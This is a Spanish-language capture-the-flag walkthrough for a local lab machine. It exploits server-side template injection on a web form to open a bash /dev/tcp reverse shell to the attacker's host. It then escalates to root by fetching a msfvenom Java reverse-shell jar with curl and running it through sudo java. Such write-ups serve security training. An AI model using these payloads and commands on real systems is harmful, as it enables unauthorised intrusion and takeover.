Haremos un escaneo de la ip para ver que puertos están abiertos y que servicios tiene asociados a ellos.
```
sudo nmap -sV -sC --min-rate 7000 -p- -Pn 172.17.0.2 -oN escaneo
```
![alt text](image.png)

Vemos que nos da una web en el puerto 5000. Vamos a ver que nos está mostrando.
![alt text](image-1.png)

Vemos que nos mustra un especie de registro de usuario, vamos a hacer una prueba.
![alt text](image-2.png)

Al darle clik a enviar, vemos que nos devuelve el nombre del usuario.
![alt text](image-3.png)

Podemos ante un un SSTI (Server Side Template Injection) en el campo del nombre de usuario. Así que vamos a hacer la prueba básica para poder comprobar si es vulnerable.
```
{{2 * 2}}
```
![alt text](image-4.png)

Vemos que al darle click nos da el resulatdo de la operación, así que ahora vamos a buscar un payloado para podernos generar una shell reversa.
```
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
```
![alt text](image-5.png)

Vemos que después de introducir este payload, nos mustra el resultado del comando `id`.
![alt text](image-6.png)

Ahora vamos a generarnos la reverse shell. Para ello nos pondremos a la escucha en un puerto.
```
nc -lnvp 6969
```
![alt text](image-7.png)

Seguidamente, con el payload encontrado previamente, vamos a introducir la reverse shell.
```
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('bash -c "exec bash -i &>/dev/tcp/172.17.0.1/6969 <&1"').read() }}
```
![alt text](image-8.png)

Vemos que después de enviar el payload, la web se nos quda colgada, esto es buna señal, así que vamos a ver si se nos ha generado la shell en nusetra terminal.
![alt text](image-9.png)

Ahora vamos a comprovar si hay binarios con permisos de administrador para poder escalar nuestros privilegios.
```
sudo -l
```
![alt text](image-10.png)

Vemos que podemos escalar privilegios con java. Para ello nos tendremos que generar un payloado con `msfvenom` para poder generar una reverse shell de administrador.
```
msfvenom -p java/shell_reverse_tcp LHOST=172.17.0.1 LPORT=4444 -f jar -o shell.jar
```
![alt text](image-11.png)

Ahora vamos a compartir el exploit a la máquina víctima por un servidor python.
```
python3 -m http.server 80
```
![alt text](image-12.png)

Ahora en la máquina víctima nos lo vamos a descargar.
```
curl http://172.17.0.1/shell.jar -o shell.jar
```
![alt text](image-13.png)

Ahora vamos a ponernos a la escucha por un puerto.
```
nc -lnvp 4444
```
![alt text](image-14.png)

Y ahora ejecutamos el archivo usando el binario.
```
sudo /usr/bin/java -jar /tmp/shell.jar
```
![alt text](image-15.png)

Veremos que después de ejectuar el archivo se nos genera una shell de administrador en la consola atacante que estaba en escucha por el puerto `4444`.